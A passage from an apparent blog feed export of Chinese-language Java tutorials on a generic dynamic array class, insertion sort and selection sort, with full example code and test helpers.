class="string">']'</span>);</span><br><span class="line">        <span class="keyword">return</span> res.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="Array-java（自定义动态数组）"><a href="#Array-java（自定义动态数组）" class="headerlink" title="Array.java（自定义动态数组）"></a>Array.java（自定义动态数组）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Array</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> E[] data;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> size;  <span class="comment">//大小</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造函数 转入数组的容量capacity构造Array</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Array</span><span class="params">(<span class="keyword">int</span> capacity)</span></span>&#123;</span><br><span class="line">        data =(E[])<span class="keyword">new</span> Object[capacity];</span><br><span class="line">        size = <span class="number">0</span>    ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 无参的构造函数，默认数组的容量capacity = 10</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Array</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(<span class="number">10</span>); <span class="comment">//调用有参构造函数传入10设定初始大小</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取数组中元素个数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSize</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取数组的容量</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getCapacity</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> data.length;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//返回数组是否为空</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向所有元素后添加一个新元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addLast</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//         if(size == data.length) &#123;</span></span><br><span class="line"><span class="comment">//             throw new IllegalArgumentException("AddLast failed. Array is full.");</span></span><br><span class="line"><span class="comment">//         &#125;</span></span><br><span class="line"><span class="comment">//         data[size] = e;</span></span><br><span class="line"><span class="comment">//         size ++;</span></span><br><span class="line">        add(size, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在所有元素前添加一个新元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addFirst</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        add(<span class="number">0</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在第index个位置插入一个新元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> index, E e)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt; size )&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Add failed. Require index &gt;=0 and index &lt;= size."</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(size == data.length) &#123;</span><br><span class="line">            resize(<span class="number">2</span> * data.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = size - <span class="number">1</span> ; i &gt;= index ; i  --)&#123;</span><br><span class="line">            data[i + <span class="number">1</span>]=data[i];</span><br><span class="line">        &#125;</span><br><span class="line">        data[index] = e;</span><br><span class="line">        size ++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取index索引位置的元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Get failed. Index is illegal."</span>);</span><br><span class="line">        <span class="keyword">return</span> data[index];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改index索引位置的元素为e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">(<span class="keyword">int</span> index, E e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"set failed. Index is illegal."</span>);</span><br><span class="line">        data[index] = e;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找数组中是否有元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; size ; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(data[i].equals(e))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找数组中元素e所在的索引，如果不存在元素e，则返回-1</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">find</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; size ; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(data[i].equals(e))</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从数组中删除index位置的元素，返回删除的元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">remove</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Remove failed. Index is illegal."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        E ret = data[index];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = index + <span class="number">1</span> ; i &lt; size ; i ++)</span><br><span class="line">        &#123;</span><br><span class="line">            data[i-<span class="number">1</span>] = data[i];</span><br><span class="line">        &#125;</span><br><span class="line">        size --;</span><br><span class="line">        data[size] = <span class="keyword">null</span>; <span class="comment">//让他自动回收 非必须写  loitering objects ！= memory leak</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(size == data.length / <span class="number">2</span>)</span><br><span class="line">            resize(data.length / <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从数组中删除第一个元素，返回删除的元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">removeFirst</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> remove(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从数组中删除最后一个元素，返回删除的元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">removeLast</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> remove(size-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从数组中删除元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">removeElement</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> index = find(e);</span><br><span class="line">        <span class="keyword">if</span>(index != -<span class="number">1</span>)</span><br><span class="line">            remove(index);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//system.out.print()所输出的类型toString覆盖</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        StringBuilder res = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        res.append(String.format(<span class="string">"Array: size = %d, capacity = %d \n"</span>, size, data.length));</span><br><span class="line">        res.append(<span class="string">'['</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; size ; i ++)&#123;</span><br><span class="line">            res.append(data[i]);</span><br><span class="line">            <span class="keyword">if</span>(i != size - <span class="number">1</span>)</span><br><span class="line">                res.append(<span class="string">", "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        res.append(<span class="string">']'</span>);</span><br><span class="line">        <span class="keyword">return</span> res.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">resize</span><span class="params">(<span class="keyword">int</span> newCapacity)</span></span>&#123;</span><br><span class="line">        E[] newData = (E[])<span class="keyword">new</span> Object[newCapacity];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; size ; i ++)</span><br><span class="line">            newData[i] = data[i];</span><br><span class="line">        data = newData;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h2 id="Main-java（调用自定义数组使用方法）"><a href="#Main-java（调用自定义数组使用方法）" class="headerlink" title="Main.java（调用自定义数组使用方法）"></a>Main.java（调用自定义数组使用方法）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        Array&lt;Integer&gt; arr = <span class="keyword">new</span> Array(<span class="number">20</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; <span class="number">10</span> ; i ++)</span><br><span class="line">            arr.addLast(i);</span><br><span class="line">        System.out.println(arr);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//在index位置插入元素为100</span></span><br><span class="line">        arr.add(<span class="number">1</span>, <span class="number">100</span>);</span><br><span class="line">        System.out.println(arr);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//在第一个元素前面添加一个-1的元素</span></span><br><span class="line">        arr.addFirst(-<span class="number">1</span>);</span><br><span class="line">        System.out.println(arr);</span><br><span class="line">        <span class="comment">//[-1, 0, 100, 1, 2, 3, 4, 5, 6, 7, 8, 9]</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//删除索引为2的元素</span></span><br><span class="line">        arr.remove(<span class="number">2</span>);</span><br><span class="line">        System.out.println(arr);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//删除4这个元素</span></span><br><span class="line">        arr.removeElement(<span class="number">4</span>);</span><br><span class="line">        System.out.println(arr);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//删除第一个元素</span></span><br><span class="line">        arr.removeFirst();</span><br><span class="line">        System.out.println(arr);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>算法与数据结构</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>数据结构</tag>
        <tag>JAVA</tag>
        <tag>插入排序</tag>
      </tags>
  </entry>
  <entry>
    <title>【Java】数据结构-插入排序法</title>
    <url>/2021/06/24/%E3%80%90Java%E3%80%91%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%8F%92%E5%85%A5%E6%8E%92%E5%BA%8F%E6%B3%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="插入排序法"><a href="#插入排序法" class="headerlink" title="插入排序法"></a>插入排序法</h1><blockquote>
<ul>
<li><h2 id="从-0-i-每一位跟自己i-1进行比较大小，如果小，就交换到前面，如果大就不变。"><a href="#从-0-i-每一位跟自己i-1进行比较大小，如果小，就交换到前面，如果大就不变。" class="headerlink" title="从[0,i)每一位跟自己i-1进行比较大小，如果小，就交换到前面，如果大就不变。"></a>从[0,i)每一位跟自己i-1进行比较大小，如果小，就交换到前面，如果大就不变。</h2></li>
</ul>
</blockquote>
<h1 id="插入排序法执行截图"><a href="#插入排序法执行截图" class="headerlink" title="插入排序法执行截图"></a>插入排序法执行截图</h1><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210624185045631.png" alt="image-20210624185045631"></p>
<h1 id="插入排序法代码（完整）"><a href="#插入排序法代码（完整）" class="headerlink" title="插入排序法代码（完整）"></a>插入排序法代码（完整）</h1><h2 id="InsertionSort-java"><a href="#InsertionSort-java" class="headerlink" title="InsertionSort.java"></a>InsertionSort.java</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InsertionSort</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="title">InsertionSort</span><span class="params">()</span></span>&#123;&#125; <span class="comment">//私有类</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(E[] arr)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; arr.length ; i++)&#123;</span><br><span class="line">                <span class="comment">// 将arr[i]插入到合适的位置</span></span><br><span class="line"><span class="comment">//                for(int j = i ; j &gt; 0; j--)  //不断和前面的值比较，小就交换，大就结束</span></span><br><span class="line"><span class="comment">//                    if(arr[j].compareTo(arr[j-1])&lt;0)</span></span><br><span class="line"><span class="comment">//                        swap(arr, j , j-1);</span></span><br><span class="line"><span class="comment">//                    else break;</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j = i; j &gt; <span class="number">0</span> &amp;&amp; arr[j].compareTo(arr[j-<span class="number">1</span>])&lt;<span class="number">0</span>; j-- )</span><br><span class="line">                    swap(arr,j,j-<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> &lt;E&gt; <span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(E[] arr, <span class="keyword">int</span> i , <span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        E t = arr[i];</span><br><span class="line">        arr[i] = arr[j];</span><br><span class="line">        arr[j] = t;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span>[] dataSize = &#123;<span class="number">10000</span>, <span class="number">100000</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> n : dataSize) &#123;</span><br><span class="line">            Integer[] arr = ArrayGenerator.generateRandomArray(n, n);</span><br><span class="line">            SortingHelper.sortTest(<span class="string">"InsertionSort"</span>, arr);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="SortingHelper-java（延续了前面的选择排序法）"><a href="#SortingHelper-java（延续了前面的选择排序法）" class="headerlink" title="SortingHelper.java（延续了前面的选择排序法）"></a>SortingHelper.java（延续了前面的选择排序法）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SortingHelper</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">SortingHelper</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">boolean</span> <span class="title">isSorted</span><span class="params">(E[] arr)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i&lt; arr.length; i++)</span><br><span class="line">            <span class="keyword">if</span> (arr[i - <span class="number">1</span>].compareTo(arr[i]) &gt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">void</span> <span class="title">sortTest</span><span class="params">(String sortname, E[] arr)</span></span>&#123;</span><br><span class="line">        <span class="keyword">long</span> startTime = System.nanoTime();</span><br><span class="line">        <span class="keyword">if</span>(sortname.equals(<span class="string">"SelectionSort"</span>))</span><br><span class="line">            SelectionSort.sort(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"InsertionSort"</span>))</span><br><span class="line">            InsertionSort.sort(arr);</span><br><span class="line">        <span class="keyword">long</span> endTime = System.nanoTime();</span><br><span class="line">        <span class="keyword">for</span>(E e:arr)&#123;</span><br><span class="line">            System.out.println(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">double</span> time = (endTime - startTime) / <span class="number">1000000000.0</span>; <span class="comment">//纳米要/9个零</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!SortingHelper.isSorted(arr))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(sortname + <span class="string">"failed"</span>);</span><br><span class="line">        System.out.println(String.format(<span class="string">"%s , n = %d : %f s "</span>, sortname, arr.length, time));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>算法与数据结构</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>数据结构</tag>
        <tag>JAVA</tag>
        <tag>插入排序</tag>
      </tags>
  </entry>
  <entry>
    <title>【Java】数据结构-选择排序法</title>
    <url>/2021/06/24/%E3%80%90Java%E3%80%91%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F%E6%B3%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="选择排序法"><a href="#选择排序法" class="headerlink" title="选择排序法"></a>选择排序法</h1><blockquote>
<ul>
<li><h2 id="原理就是不断将剩下元素中最小的数拿出来"><a href="#原理就是不断将剩下元素中最小的数拿出来" class="headerlink" title="原理就是不断将剩下元素中最小的数拿出来"></a>原理就是不断将剩下元素中最小的数拿出来</h2><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210624133947347.png" alt="image-20210624133947347"></li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="选择排序算法执行截图"><a href="#选择排序算法执行截图" class="headerlink" title="选择排序算法执行截图"></a>选择排序算法执行截图</h1><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210624142356230.png" alt="image-20210624142356230"></p>
<h1 id="（完整代码）选择排序算法基础代码"><a href="#（完整代码）选择排序算法基础代码" class="headerlink" title="（完整代码）选择排序算法基础代码"></a>（完整代码）选择排序算法基础代码</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SelectionSort</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">SelectionSort</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(E[] arr)</span></span>&#123;  <span class="comment">//泛型 扩展 compareable 接口</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// arr[0...i)是有序的； arr[i...n)是无序的</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; arr.length; i++)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 选择arr[i……n)中最小值的索引</span></span><br><span class="line">            <span class="keyword">int</span> minIndex = i;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = i; j &lt; arr.length; j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(arr[j].compareTo(arr[minIndex]) &lt; <span class="number">0</span>)  <span class="comment">// 返回的是整型，小于0代表前者小于后者</span></span><br><span class="line">                    minIndex=j; <span class="comment">//存的最小值所对应的索引</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            swap(arr, i, minIndex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> &lt;E&gt; <span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(E[] arr, <span class="keyword">int</span> i , <span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        E t = arr[i];</span><br><span class="line">        arr[i] = arr[j];</span><br><span class="line">        arr[j] = t;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        Integer[] arr = &#123;<span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">5</span>&#125;;</span><br><span class="line">        SelectionSort.sort(arr);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> e: arr)</span><br><span class="line">            System.out.print(e + <span class="string">" "</span>);</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="选择排序算法“优化”类排序执行截图"><a href="#选择排序算法“优化”类排序执行截图" class="headerlink" title="选择排序算法“优化”类排序执行截图"></a>选择排序算法“优化”类排序执行截图</h1><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210624145050773.png" alt="image-20210624145050773"></p>
<h1 id="（完整代码）选择排序选择排序算法“优化”类成员数值排序"><a href="#（完整代码）选择排序选择排序算法“优化”类成员数值排序" class="headerlink" title="（完整代码）选择排序选择排序算法“优化”类成员数值排序"></a>（完整代码）选择排序选择排序算法“优化”类成员数值排序</h1><h2 id="SelectionSort-java"><a href="#SelectionSort-java" class="headerlink" title="SelectionSort.java"></a>SelectionSort.java</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SelectionSort</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">SelectionSort</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(E[] arr)</span></span>&#123;  <span class="comment">//泛型 扩展 compareable 接口</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// arr[0...i)是有序的； arr[i...n)是无序的</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; arr.length; i++)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 选择arr[i……n)中最小值的索引</span></span><br><span class="line">            <span class="keyword">int</span> minIndex = i;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = i; j &lt; arr.length; j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(arr[j].compareTo(arr[minIndex]) &lt; <span class="number">0</span>)  <span class="comment">// 返回的是整型，小于0代表前者小于后者</span></span><br><span class="line">                    minIndex=j; <span class="comment">//存的最小值所对应的索引</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            swap(arr, i, minIndex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> &lt;E&gt; <span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(E[] arr, <span class="keyword">int</span> i , <span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        E t = arr[i];</span><br><span class="line">        arr[i] = arr[j];</span><br><span class="line">        arr[j] = t;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        Integer[] arr = &#123;<span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">5</span>&#125;;</span><br><span class="line">        SelectionSort.sort(arr);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> e: arr)</span><br><span class="line">            System.out.print(e + <span class="string">" "</span>);</span><br><span class="line">        System.out.println();</span><br><span class="line"></span><br><span class="line">        Student[] students = &#123;<span class="keyword">new</span> Student(<span class="string">"Alice"</span>, <span class="number">98</span>),</span><br><span class="line">                            <span class="keyword">new</span> Student(<span class="string">"Bob"</span>, <span class="number">100</span>),</span><br><span class="line">                            <span class="keyword">new</span> Student(<span class="string">"Charles"</span>, <span class="number">66</span>)&#125;;</span><br><span class="line">        SelectionSort.sort(students);</span><br><span class="line">        <span class="keyword">for</span>(Student student: students)</span><br><span class="line">            System.out.print(student + <span class="string">" "</span>);</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="Override-覆盖方法Student-java"><a href="#Override-覆盖方法Student-java" class="headerlink" title="(Override)覆盖方法Student.java"></a>(Override)覆盖方法Student.java</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">Comparable</span>&lt;<span class="title">Student</span>&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> score;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name , <span class="keyword">int</span> score)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.score = score;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span 